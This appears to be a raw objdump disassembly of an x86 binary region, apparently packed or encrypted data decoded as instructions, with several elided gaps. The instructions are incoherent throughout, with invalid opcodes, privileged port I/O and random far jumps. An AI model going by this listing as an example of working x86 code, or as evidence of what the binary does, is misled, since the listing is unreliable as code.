  42abdd:	xor    edi,DWORD PTR [ebp-0x752ad669]
  42abe3:	dec    esp
  42abe4:	jae    0x42ab74
  42abe6:	lods   eax,DWORD PTR ds:[esi]
  42abe7:	pop    ebp
  42abe8:	add    al,0xf1
  42abea:	lock lea esi,[eax]
  42abed:	and    al,0x65
  42abef:	in     al,0x11
  42abf1:	or     bh,ch
  42abf3:	and    DWORD PTR [ecx-0x69b2822c],esp
  42abf9:	or     eax,0x281c434b
  42abfe:	stc    
  42abff:	inc    esp
  42ac00:	lock adc al,0xc4
  42ac03:	ins    BYTE PTR es:[edi],dx
  42ac04:	fsub   QWORD PTR [ebx-0x57]
  42ac07:	add    ch,BYTE PTR [edx+0x29ac862a]
  42ac0d:	jmp    0xa344622f
  42ac12:	(bad)  
  42ac13:	sub    eax,DWORD PTR [edi-0x1f]
  42ac16:	repnz call 0xbe3d:0xb415abdc
  42ac1e:	and    edx,DWORD PTR [ebx]
  42ac20:	out    0x11,al
  42ac22:	dec    ecx
  42ac23:	add    eax,0x6f33fbdd
  42ac28:	aas    
  42ac29:	mov    dl,0x21
  42ac2b:	push   0x2d
  42ac2d:	sub    al,0x7e
  42ac2f:	sub    BYTE PTR [edi-0x247d4dc9],0x7b
  42ac36:	mov    edi,0x26be2ccb
  42ac3b:	push   ebx
  42ac3c:	shl    BYTE PTR [eax],0x75
  42ac3f:	mov    edi,0xaacdbc4
  42ac44:	loope  0x42abef
  42ac46:	(bad)  
  42ac47:	gs leave 
  42ac49:	inc    esi
  42ac4a:	fnstenv [ebp+0x62d7db0c]
  42ac50:	cmp    dl,BYTE PTR [ecx+ebp*2+0x450d92e6]
  42ac57:	sahf   
  42ac58:	dec    ecx
  42ac59:	add    BYTE PTR [ecx],dh
  42ac5b:	ja     0x42ac8b
  42ac5d:	mov    edx,0x5505459f
  42ac62:	xor    ah,cl
  42ac64:	fist   WORD PTR [edx-0x48]
  42ac67:	iret   
  42ac68:	dec    ecx
  42ac69:	scas   eax,DWORD PTR es:[edi]
  42ac6a:	lods   eax,DWORD PTR ds:[esi]
  42ac6b:	adc    BYTE PTR [eax-0x33d89390],dl
  42ac71:	dec    esp
  42ac72:	push   ds
  42ac73:	les    ebx,FWORD PTR ds:0x3ad676
  42ac79:	mov    ecx,0x40d09c94
  42ac7e:	imul   ebx
  42ac80:	mov    ch,al
  42ac82:	stc    
  42ac83:	outs   dx,BYTE PTR ds:[esi]
  42ac84:	inc    edi
  42ac85:	bound  esp,QWORD PTR [eax]
  42ac87:	sub    ecx,DWORD PTR [ebx+0x53]
  42ac8a:	cmp    BYTE PTR [ebp+0x43],dh
  42ac8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac8e:	mov    edi,fs
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	dec    eax
  42ad01:	dec    al
  42ad03:	lods   al,BYTE PTR ds:[esi]
  42ad04:	lods   al,BYTE PTR ds:[esi]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	(bad)  
  42ad0d:	jl     0x42ad4b
  42ad0f:	retf   0x9892
  42ad12:	sub    BYTE PTR [ebx+0x740ba1e3],bl
  42ad18:	lods   al,BYTE PTR ds:[esi]
  42ad19:	mov    edx,0x8f1a9c22
  42ad1e:	mov    bh,0x3
  42ad20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad21:	sub    esp,edx
  42ad23:	push   ebx
  42ad24:	ret    0xc853
  42ad27:	test   BYTE PTR [edx],cl
  42ad29:	outs   dx,BYTE PTR ds:[esi]
  42ad2a:	sahf   
  42ad2b:	xchg   ebp,eax
  42ad2c:	je     0x42acfa
  42ad2e:	sub    ch,BYTE PTR [esi+0x10]
  42ad31:	jnp    0x42ad12
  42ad33:	cmp    al,0x25
  42ad35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad36:	jae    0x42ad87
  42ad38:	(bad)  
  42ad39:	repnz neg BYTE PTR [eax-0x7220eb34]
  42ad40:	inc    ebp
  42ad41:	sahf   
  42ad42:	scas   eax,DWORD PTR es:[edi]
  42ad43:	mov    al,0xf1
  42ad45:	repnz dec ebx
  42ad47:	xchg   BYTE PTR [ebx+0x25],cl
  42ad4a:	mov    ch,0x80
  42ad4c:	cmp    ecx,DWORD PTR [ecx-0x336e4747]
  42ad52:	icebp  
  42ad53:	fisttp WORD PTR [eax+0x56]
  42ad56:	or     eax,0xe11651ef
  42ad5b:	out    dx,al
  42ad5c:	dec    esi
  42ad5d:	leave  
  42ad5e:	das    
  42ad5f:	dec    eax
  42ad60:	adc    eax,0x2fdfff9e
  42ad65:	fist   DWORD PTR [esi]
  42ad67:	mov    BYTE PTR [eax+0x7c24c5f0],ah
  42ad6d:	xchg   ebx,eax
  42ad6e:	xchg   ebp,eax
  42ad6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad70:	les    ebp,FWORD PTR [eax]
  42ad72:	daa    
  42ad73:	test   BYTE PTR [edx+0x2b],bl
  42ad76:	xor    eax,0x3a3d05e3
  42ad7b:	cdq    
  42ad7c:	ret    
  42ad7d:	push   esi
  42ad7e:	retw   
  42ad80:	mov    esi,0xa78ccc78
  42ad85:	ds xchg edx,eax
  42ad87:	dec    edi
  42ad88:	mov    dl,0x53
  42ad8a:	nop
  42ad8b:	les    ebp,FWORD PTR [edi-0x1024cf77]
  42ad91:	and    BYTE PTR ds:0x69aad147,dh
  42ad97:	xchg   esi,eax
  42ad98:	gs aas 
  42ad9a:	dec    edi
  42ad9b:	or     DWORD PTR [ecx],esi
  42ad9d:	sub    DWORD PTR [edx-0x4e],esp
  42ada0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ada1:	sub    al,0x98
  42ada3:	jmp    0x42add9
  42ada5:	cdq    
  42ada6:	dec    esp
  42ada7:	mov    ebp,eax
  42ada9:	pop    eax
  42adaa:	aad    0x22
  42adac:	(bad)  
  42adad:	jl     0x42ada7
  42adaf:	inc    esi
  42adb0:	rcl    DWORD PTR [esi+0x54a04a1a],0xf2
  42adb7:	jb     0x42ae19
  42adb9:	enter  0x6f1d,0xa8
  42adbd:	repz fcmovu st,st(3)
  42adc0:	cs push ss
  42adc2:	or     edx,DWORD PTR [eax+0x4b]
  42adc5:	and    BYTE PTR [edi-0x4bdf3c38],bl
  42adcb:	sbb    ecx,DWORD PTR [edx-0x80]
  42adce:	jb     0x42ada2
  42add0:	mov    ebx,0x262efc91
  42add5:	imul   edx,DWORD PTR [ecx+0x1],0x41aa1be5
  42addc:	push   ebp
  42addd:	mov    ch,al
  42addf:	je     0x42ae25
  42ade1:	mov    BYTE PTR [edi],ah
  42ade3:	or     BYTE PTR [ebx],ch
  42ade5:	jno    0x42ae66
  42ade7:	int    0x89
  42ade9:	cs aad 0xec
  42adec:	adc    BYTE PTR [edi-0x7c787bfc],ah
  42adf2:	shr    DWORD PTR [edi+0x68],0x59
  42adf6:	jg     0x42ad82
  42adf8:	ja     0x42ae54
  42adfa:	out    0x4e,al
  42adfc:	dec    ebx
  42adfd:	mov    ecx,0x82deb708
  42ae02:	xor    DWORD PTR [ecx],ecx
  42ae04:	ret    
  42ae05:	cmp    eax,0xff64c3f4
  42ae0a:	xor    BYTE PTR gs:[ebp+0x7b],ah
  42ae0e:	adc    DWORD PTR [eax+0x0],eax
	...
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	adc    DWORD PTR [esi-0x354ffde3],esi
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	ins    BYTE PTR es:[edi],dx
  42ae8d:	cmp    BYTE PTR ds:0xf76bffba,ch
  42ae93:	test   BYTE PTR [edx-0x5e68ced0],ah
  42ae99:	add    ebx,DWORD PTR [eax+0xa]
  42ae9c:	fwait
  42ae9d:	in     al,0x83
  42ae9f:	je     0x42ae86
  42aea1:	or     ebx,DWORD PTR [ecx-0xbf02425]
  42aea7:	push   ss
  42aea8:	ds stos DWORD PTR es:[edi],eax
  42aeaa:	or     BYTE PTR [esi+esi*4+0x10],dl
  42aeae:	push   edx
  42aeaf:	retf   
  42aeb0:	idiv   DWORD PTR [edi-0x17]
  42aeb3:	jge    0x42aea4
  42aeb5:	imul   eax,DWORD PTR [edi+eax*4-0x60c16d72],0x3aae9c25
  42aec0:	xor    BYTE PTR [esi],0x1d
  42aec3:	cld    
  42aec4:	push   ds
  42aec5:	imul   ecx,ecx,0x46
  42aec8:	xchg   ebx,eax
  42aec9:	iret   
  42aeca:	sub    BYTE PTR [eax],ch
  42aecc:	pop    esi
  42aecd:	sbb    edx,ecx
  42aecf:	popf   
  42aed0:	xchg   ebx,eax
  42aed1:	arpl   WORD PTR [esi+0x4b],di
  42aed4:	push   0x7c
  42aed6:	call   0x895:0xd66911c3
  42aedd:	push   ss
  42aede:	cwde   
  42aedf:	jae    0x42ae6f
  42aee1:	mov    eax,0x41bc63b3
  42aee6:	mov    dh,0x52
  42aee8:	iret   
  42aee9:	mov    edx,0xd33138b7
  42aeee:	(bad)  
  42aef0:	fdivr  QWORD PTR [edi-0x6f982710]
  42aef6:	rol    DWORD PTR cs:[ecx+0x66],cl
  42aefa:	(bad)  
  42aefb:	cmp    BYTE PTR [ebx+0x18336b58],bl
  42af01:	xchg   ebp,edi
  42af03:	aam    0x7d
  42af05:	fdiv   QWORD PTR [ecx]
  42af07:	add    eax,0x5b077905
  42af0c:	inc    ebp
  42af0d:	xchg   edx,eax
  42af0e:	jno    0x42aeb8
  42af10:	pop    ss
  42af11:	ret    0x4aa4
  42af14:	or     BYTE PTR [edi-0x39a98245],dh
  42af1a:	outs   dx,DWORD PTR ds:[esi]
  42af1b:	rcl    BYTE PTR [ebx],cl
  42af1d:	xor    bl,BYTE PTR [edx]
  42af1f:	fcom   DWORD PTR [ebx+0x61d6d83a]
  42af25:	jmp    0x42aeb7
  42af27:	xchg   esp,eax
  42af28:	int    0x39
  42af2a:	aaa    
  42af2b:	jb     0x42aefc
  42af2d:	pop    ebp
  42af2e:	jbe    0x42aed8
  42af30:	ret    0x9ced
  42af33:	int3   
  42af34:	stc    
  42af35:	sub    edx,edi
  42af37:	pop    ss
  42af38:	inc    edi
  42af39:	pop    esi
  42af3a:	xlat   BYTE PTR ds:[ebx]
  42af3b:	dec    edi
  42af3c:	loope  0x42af19
  42af3e:	dec    DWORD PTR [edi]
  42af40:	mov    al,ds:0xaf6cb586
  42af45:	pushf  
  42af46:	mov    bl,0xa1
  42af48:	repz jnp 0x42af74
  42af4b:	in     eax,dx
  42af4c:	or     BYTE PTR [esi-0xdfc0e37],0xf7
  42af53:	neg    DWORD PTR [edi]
  42af55:	clc    
  42af56:	test   al,0x79
  42af58:	or     eax,0x50b5d1fc
  42af5d:	or     BYTE PTR [eax+0x33],cl
  42af60:	dec    edi
  42af61:	inc    esi
  42af62:	and    al,0x84
  42af64:	dec    ecx
  42af65:	sub    eax,DWORD PTR [ebx-0x31]
  42af68:	idiv   ch
  42af6a:	mov    edx,0x672db8ea
  42af6f:	fidivr WORD PTR [edx]
  42af71:	mov    edx,0x53f280d0
  42af76:	xchg   ebp,eax
  42af77:	and    al,0x8e
  42af79:	addr16 push ds
  42af7b:	jmp    0xa978:0x28cf3c9e
  42af82:	xlat   BYTE PTR ds:[ebx]
  42af83:	xor    BYTE PTR [esi+0xa],ch
  42af86:	or     esp,0x74
  42af89:	xchg   ebp,eax
  42af8a:	rol    DWORD PTR ds:0xb996b616,1
	...
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	mov    ds,WORD PTR [eax-0x344bfa4e]
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	inc    esi
  42b00d:	bnd jbe 0x42b049
  42b010:	in     al,dx
  42b011:	imul   esp,DWORD PTR [eax],0x98ab6d0b
  42b017:	movd   mm7,DWORD PTR [ecx-0x75]
  42b01b:	mov    DWORD PTR [edx],0xd8d1ccdb
  42b021:	addr16 cli 
  42b023:	in     al,dx
  42b024:	mov    edi,0x97fe5a1f
  42b029:	sbb    DWORD PTR [esi+0x660e58bc],esp
  42b02f:	inc    esp
  42b030:	sbb    eax,0x50742a11
  42b035:	scas   eax,DWORD PTR es:[edi]
  42b036:	adc    eax,0xbf03f148
  42b03b:	lods   eax,DWORD PTR ds:[esi]
  42b03c:	push   ss
  42b03d:	and    ah,BYTE PTR [esi]
  42b03f:	(bad)  
  42b040:	jb     0x42afda
  42b042:	push   cs
  42b043:	loopne 0x42b089
  42b045:	(bad)  
  42b047:	in     al,dx
  42b048:	pop    es
  42b049:	(bad)  
  42b04a:	adc    DWORD PTR [esp+ecx*1+0x23],0x5c78dbe5
  42b052:	test   BYTE PTR [eax-0x38],dl
  42b055:	fstp   st(6)
  42b057:	(bad)  
  42b058:	popa   
  42b059:	cwde   
  42b05a:	pop    ecx
  42b05b:	mov    esp,0xa33b36ae
  42b060:	ror    BYTE PTR [edx+0x2e83c3be],cl
  42b066:	mov    cl,0x13
  42b068:	in     al,dx
  42b069:	sbb    eax,DWORD PTR ds:0x847bdcdf
  42b070:	push   ecx
  42b071:	sub    edx,ecx
  42b073:	mov    eax,0xa0c40ee7
  42b078:	mov    eax,0xeccf0deb
  42b07d:	xchg   di,ax
  42b07f:	mov    dh,0x88
  42b081:	shl    DWORD PTR [ebx+0x63],0x74
  42b085:	mov    esi,0xaa27f531
  42b08a:	out    dx,eax
  42b08b:	push   ebx
  42b08c:	mov    esp,0xbb33c75d
  42b091:	xor    esi,DWORD PTR [edx-0x4e]
  42b094:	mov    ds:0x702b704b,eax
  42b099:	sub    eax,0x8e87f866
  42b09e:	mov    BYTE PTR [ecx-0x50ed01b5],cl
  42b0a4:	ins    BYTE PTR es:[edi],dx
  42b0a5:	pop    eax
  42b0a7:	loope  0x42b063
  42b0a9:	(bad)  
  42b0aa:	or     DWORD PTR [ebx-0x6f],edi
  42b0ad:	adc    al,0x97
  42b0af:	and    al,0xf5
  42b0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0b2:	sbb    DWORD PTR ds:0xd9ad6f5a,0xffffff85
  42b0b9:	mov    dl,0x3a
  42b0bb:	jp     0x42b109
  42b0bd:	pop    ss
  42b0be:	or     bh,ah
  42b0c0:	test   eax,0xb8b0908c
  42b0c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b0c6:	push   ebp
  42b0c7:	in     eax,0x3
  42b0c9:	jnp    0x42b055
  42b0cb:	push   ss
  42b0cc:	repz sub eax,0x995b82a1
  42b0d2:	mov    dl,0x6
  42b0d4:	mov    cl,0x3
  42b0d6:	cld    
  42b0d7:	mov    eax,0x9c53ef19
  42b0dc:	push   cs
  42b0dd:	je     0x42b158
  42b0df:	sti    
  42b0e0:	jno    0x42b0b7
  42b0e2:	fistp  QWORD PTR [eax+ebp*8-0x42b2fc6c]
  42b0e9:	cmp    ah,cl
  42b0eb:	stos   BYTE PTR es:[edi],al
  42b0ec:	push   0xfffffffb
  42b0ee:	es stc 
  42b0f0:	fdiv   st,st(1)
  42b0f2:	dec    ebx
  42b0f3:	test   BYTE PTR [ebx-0x3d7a98f4],0x3b
  42b0fa:	and    dh,BYTE PTR [ebx+0x2]
  42b0fd:	inc    ebp
  42b0fe:	jno    0x42b0ba
  42b100:	mov    eax,0xfaadae0b
  42b105:	xor    BYTE PTR [eax+0x546fb9a8],dl
  42b10b:	xchg   ecx,eax
  42b10c:	push   ebx
  42b10d:	stc    
  42b10e:	xchg   ebx,eax
  42b10f:	dec    esi
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	sub    al,0x93
  42b182:	mov    dh,0x43
  42b184:	mov    eax,0x40001cc
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    BYTE PTR [eax+0x1d517533],al
  42b191:	lods   al,BYTE PTR ds:[esi]
  42b192:	jl     0x42b212
  42b194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b195:	or     edi,DWORD PTR [ebx+ecx*4-0x29]
  42b199:	pop    ecx
  42b19a:	retf   0xf47
  42b19d:	add    edi,DWORD PTR [edx-0x7bea7e5e]
  42b1a3:	xchg   edx,eax
  42b1a4:	fwait
  42b1a5:	sub    BYTE PTR [edx-0x1a],dh
  42b1a8:	xor    bl,BYTE PTR [eax+0x78e0b732]
  42b1ae:	sbb    DWORD PTR [eax],ebp
  42b1b0:	test   dh,ah
  42b1b2:	test   eax,0xa04fc407
  42b1b7:	mov    ecx,0x3e90bdd7
  42b1bc:	clc    
  42b1bd:	push   cs
  42b1be:	cmp    al,0x51
  42b1c0:	add    BYTE PTR [esi+edi*2-0x20712cf7],al
  42b1c7:	cmp    al,0x6b
  42b1c9:	out    0xf4,al
  42b1cb:	or     BYTE PTR [edx+0x6d],bl
  42b1ce:	aaa    
  42b1cf:	push   esi
  42b1d0:	aad    0x8e
  42b1d2:	inc    edx
  42b1d3:	fidivr DWORD PTR [edx+eax*2]
  42b1d6:	dec    esi
  42b1d7:	rol    BYTE PTR [esi-0x16],0xb0
  42b1db:	addr16 aaa 
  42b1dd:	fs jo  0x42b236
  42b1e0:	add    cl,bh
  42b1e2:	cld    
  42b1e3:	jo     0x42b1a0
  42b1e5:	scas   al,BYTE PTR es:[edi]
  42b1e6:	xchg   edx,eax
  42b1e7:	repnz mov esp,0x814aae0
  42b1ed:	cwde   
  42b1ee:	pop    ebp
  42b1ef:	(bad)
  42b1f4:	mov    ds:0x927cc694,eax
  42b1f9:	mov    bl,0x3b
  42b1fb:	enter  0x4425,0xd2
  42b1ff:	push   ecx
  42b200:	ins    DWORD PTR es:[edi],dx
  42b201:	jecxz  0x42b243
  42b203:	rol    DWORD PTR [esi-0x56622e6f],0x84
  42b20a:	add    BYTE PTR [eax+0x62],dl
  42b20d:	or     DWORD PTR [edi-0x59be0332],ebx
  42b213:	dec    edx
  42b214:	mov    dh,0xa
  42b216:	ror    esp,0x38
  42b219:	dec    ebx
  42b21a:	xchg   esp,eax
  42b21b:	mov    eax,0xf464a225
  42b220:	imul   edx,esi,0x6ce096f0
  42b226:	mov    edx,DWORD PTR [eax-0x2535733f]
  42b22c:	out    0x2f,al
  42b22e:	jb     0x42b25f
  42b230:	xlat   BYTE PTR ds:[ebx]
  42b231:	mov    bl,0x8
  42b233:	pop    ebp
  42b234:	inc    ebp
  42b235:	mov    esi,0x4f661c01
  42b23a:	sahf   
  42b23b:	arpl   WORD PTR [bx-0x4610],si
  42b240:	bound  ecx,QWORD PTR [ebx]
  42b242:	or     al,0xf
  42b244:	adc    esp,eax
  42b246:	cmp    al,0x39
  42b248:	jp     0x42b2a7
  42b24a:	aam    0xc6
  42b24c:	jmp    0x73c69eba
  42b251:	repnz mov dl,0xf
  42b254:	fcomp  DWORD PTR [edi-0x53]
  42b257:	shl    BYTE PTR [ebx+0x19],1
  42b25a:	push   ss
  42b25b:	pop    es
  42b25c:	mov    dl,0xfe
  42b25e:	ds ret 
  42b260:	cmp    eax,0x32435dfb
  42b265:	outs   dx,BYTE PTR ds:[esi]
  42b266:	ds jmp 0xea4d:0xcdd7a21b
  42b26e:	cwde   
  42b26f:	outs   dx,BYTE PTR ds:[esi]
  42b270:	sub    dl,BYTE PTR [edx]
  42b272:	inc    DWORD PTR [edi]
  42b274:	(bad)  
  42b275:	jle    0x42b26b
  42b277:	ror    DWORD PTR ds:0x8f799b4e,cl
  42b27d:	xor    BYTE PTR [ebx+0x5f6097fc],al
  42b283:	pop    ecx
  42b284:	lock push cs
  42b286:	icebp  
  42b287:	dec    edx
  42b288:	inc    edi
  42b289:	add    BYTE PTR [ecx-0x5a6e3fcb],bh
  42b28f:	ret    0x0
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x24738e65
  42b301:	xor    eax,0xcdbcfcf6
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    al,0x1
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	push   eax
  42b30d:	push   0xe95c909d
  42b312:	jae    0x42b348
  42b314:	fidiv  DWORD PTR [ebp-0x59c9fef9]
  42b31a:	div    ecx
  42b31c:	jp     0x42b2f9
  42b31e:	js     0x42b2f1
  42b320:	jg     0x42b34e
  42b322:	ss in  al,dx
  42b324:	mov    ds:0xee7658ab,al
  42b329:	add    DWORD PTR [edi-0x2a],ebx
  42b32c:	mov    ds,ebp
  42b32e:	fwait
  42b32f:	or     BYTE PTR [eax],0x8
  42b332:	test   DWORD PTR [ecx+esi*8],ecx
  42b335:	jns    0x42b3aa
  42b337:	arpl   WORD PTR [eax+ebx*2],dx
  42b33a:	lds    ebx,FWORD PTR [esi-0xd]
  42b33d:	dec    esi
  42b33e:	pusha  
  42b33f:	pop    esi
  42b340:	mov    dl,0x73
  42b342:	int    0xb8
  42b344:	sub    DWORD PTR [edi+0x22390f41],esi
  42b34a:	or     esi,ebx
  42b34c:	sub    al,0x6b
  42b34e:	ss jge 0x42b2f9
  42b351:	adc    bh,al
  42b353:	das    
  42b354:	and    BYTE PTR [eax+0x1f6316d6],bl
  42b35a:	out    0x91,al
  42b35c:	jge    0x42b2ed
  42b35e:	pop    ss
  42b35f:	je     0x42b3da
  42b361:	fisub  DWORD PTR [esi+edi*2-0x2550aab2]
  42b368:	mov    ch,0xdb
  42b36a:	mov    dl,0x5c
  42b36c:	ss ja  0x42b39e
  42b36f:	scas   eax,DWORD PTR es:[edi]
  42b370:	out    dx,al
  42b371:	in     eax,dx
  42b372:	sub    BYTE PTR [ecx+0x41c3fd9d],dl
  42b378:	sti    
  42b379:	ja     0x42b323
  42b37b:	pop    ebp
  42b37c:	inc    ebx
  42b37d:	sbb    cl,BYTE PTR [edx+0x6477cd01]
  42b383:	lods   al,BYTE PTR ds:[esi]
  42b384:	xor    edx,DWORD PTR [edi-0x7a]
  42b387:	test   eax,0x9ff0a054
  42b38c:	je     0x42b3b5
  42b38e:	cs push cs
  42b390:	add    DWORD PTR [ecx+0x2cc9e8ea],esp
  42b396:	fwait
  42b397:	das    
  42b398:	add    bh,BYTE PTR [bx+di]
  42b39b:	sbb    bh,al
  42b39d:	ret    0x192e
  42b3a0:	repnz push ebx
  42b3a2:	mov    ?,WORD PTR [esi+0xb]
  42b3a5:	pop    ebx
  42b3a6:	pmulhw mm4,QWORD PTR [ebp+0x71]
  42b3aa:	test   eax,0xeb61684
  42b3af:	push   edx
  42b3b0:	mov    eax,0x6cacf1a
  42b3b5:	sbb    dh,cl
  42b3b7:	scas   ax,WORD PTR es:[edi]
  42b3b9:	(bad)  
  42b3ba:	jbe    0x42b35c
  42b3bc:	xlat   BYTE PTR ds:[ebx]
  42b3bd:	dec    ecx
  42b3be:	mov    ah,0x5c
  42b3c0:	in     al,0xa0
  42b3c2:	jmp    0x5c36:0x4e590456
  42b3c9:	addr16 out dx,al
  42b3cb:	dec    ebp
  42b3cc:	inc    edi
  42b3cd:	idiv   BYTE PTR [eax-0x54]
  42b3d0:	jle    0x42b3f8
  42b3d2:	daa    
  42b3d3:	popf   
  42b3d4:	int    0x75
  42b3d6:	mov    esi,DWORD PTR [ecx+0x59]
  42b3d9:	push   0xffffffe3
  42b3db:	int    0x99
  42b3dd:	lods   al,BYTE PTR ds:[esi]
  42b3de:	mov    bh,0xad
  42b3e0:	and    esi,DWORD PTR cs:[eax-0xf]
  42b3e4:	call   0x68a9:0x348b4cb8
  42b3eb:	addr16 imul ebp,edi,0x6ee3bdbf
  42b3f2:	push   ds
  42b3f3:	fwait
  42b3f4:	aam    0xb0
  42b3f6:	(bad)  
  42b3f7:	aam    0x71
  42b3f9:	leave  
  42b3fa:	fisttp DWORD PTR [esi-0x35]
  42b3fd:	out    0x61,al
  42b3ff:	push   esi
  42b400:	(bad)  
  42b401:	mov    ebp,0xd9389b43
  42b406:	call   0xb4db6db
  42b40b:	jnp    0x42b3a9
  42b40d:	xor    BYTE PTR [ebx+0xc],ch
	...
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [eax],eax
  42b481:	mov    bh,0xa
  42b483:	or     eax,eax
  42b485:	into   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    al,0x1
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	jg     0x42b45f
  42b48e:	inc    edx
  42b48f:	mov    al,ds:0x41003260
  42b494:	cld    
  42b495:	not    DWORD PTR [ecx-0x2c]
  42b498:	pop    ss
  42b499:	jnp    0x42b464
  42b49b:	sbb    ah,BYTE PTR [ecx]
  42b49d:	ins    DWORD PTR es:[edi],dx
  42b49e:	cmp    DWORD PTR [ebp+0x74],0xd8e548a5
  42b4a5:	rol    ebp,cl
  42b4a7:	pop    ds
  42b4a8:	ins    BYTE PTR es:[edi],dx
  42b4a9:	popf   
  42b4aa:	scas   al,BYTE PTR es:[di]
  42b4ac:	fisub  WORD PTR [esi+0x795f8cca]
  42b4b2:	(bad)  
  42b4b3:	pop    ebx
  42b4b4:	test   eax,0x2da2222d
  42b4b9:	jbe    0x42b4e4
  42b4bb:	fistp  WORD PTR [ebx-0x29]
  42b4be:	fs lock cdq 
  42b4c1:	(bad)  
  42b4c2:	mov    esp,0x70a86d31
  42b4c7:	inc    edx
  42b4c8:	fmul   QWORD PTR [edi-0x14]
  42b4cb:	mov    esp,0x2ad8e9a
  42b4d0:	scas   eax,DWORD PTR es:[edi]
  42b4d1:	out    0xb8,eax
  42b4d3:	das    
  42b4d4:	repnz test ch,dh
  42b4d7:	cli    
  42b4d8:	stc    
  42b4d9:	sbb    edx,DWORD PTR [esi-0x6b89e012]
  42b4df:	int3   
  42b4e0:	pop    es
  42b4e1:	mov    ?,esp
  42b4e3:	or     dl,BYTE PTR [ecx+0x25]
  42b4e6:	call   0x36ed81c
  42b4eb:	scas   eax,DWORD PTR es:[edi]
  42b4ec:	data16 fild QWORD PTR [ecx]
  42b4ef:	lock cli 
  42b4f1:	mov    ecx,0x4923f29f
  42b4f6:	aam    0x3b
  42b4f8:	in     al,dx
  42b4f9:	or     ch,BYTE PTR [edx-0x7e3e2a73]
  42b4ff:	jg     0x42b48d
  42b501:	scas   eax,DWORD PTR es:[edi]
  42b502:	adc    ecx,eax
  42b504:	inc    DWORD PTR [ebp-0x44]
  42b507:	mov    dl,0x45
  42b509:	fisttp WORD PTR [edx-0x40902ef9]
  42b50f:	or     BYTE PTR [ecx+eax*8+0x2d01999a],ah
  42b516:	jb     0x42b582
  42b518:	mov    eax,ds:0x8e4a9732
  42b51d:	inc    ecx
  42b51e:	cli    
  42b51f:	inc    ebp
  42b520:	fistp  WORD PTR [esp+edi*4]
  42b523:	xchg   esi,eax
  42b524:	sub    DWORD PTR [esi+0xd30df0f],ecx
  42b52a:	mov    dh,0x43
  42b52c:	pop    ecx
  42b52d:	push   esp
  42b52e:	cmp    al,0x75
  42b530:	add    DWORD PTR [ebp-0x21],edx
  42b533:	xchg   ecx,eax
  42b534:	push   eax
  42b535:	fadd   st,st(4)
  42b537:	push   esi
  42b538:	pop    edi
  42b539:	iret   
  42b53a:	add    BYTE PTR [ecx-0xe],0x37
  42b53e:	aam    0x3e
  42b540:	fisubr DWORD PTR [edx+0x227892ca]
  42b546:	push   ss
  42b547:	shr    esp,cl
  42b549:	je     0x42b5ac
  42b54b:	outs   dx,DWORD PTR ds:[esi]
  42b54c:	(bad)  
  42b54e:	pop    eax
  42b54f:	nop
  42b550:	lock (bad) [ecx-0x4f]
  42b554:	sahf   
  42b555:	stos   BYTE PTR es:[edi],al
  42b556:	iret   
  42b557:	add    al,0x63
  42b559:	pop    es
  42b55a:	fld    QWORD PTR [esi-0x80]
  42b55d:	mov    DWORD PTR [edi-0x11c44241],ebx
  42b563:	(bad)  
  42b564:	clc    
  42b565:	int3   
  42b566:	stos   BYTE PTR es:[edi],al
  42b567:	pop    edx
  42b568:	mov    ebx,0xa8ed9c11
  42b56d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b56e:	pop    ss
  42b56f:	test   DWORD PTR [ebx-0x396646c3],esi
  42b575:	imul   esi,eax,0x31
  42b578:	retf   0x8677
  42b57b:	mov    edx,esi
  42b57d:	jl     0x42b52e
  42b57f:	dec    edx
  42b580:	sahf   
  42b581:	sar    DWORD PTR [edi+0x1e],0x2
  42b585:	mov    edx,0xf9c47ab
  42b58a:	loopne 0x42b561
  42b58c:	sahf   
  42b58d:	or     esi,esi
  42b58f:	arpl   WORD PTR [eax],ax
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	test   BYTE PTR [esp+esi*4+0x1cfc4ca],dh
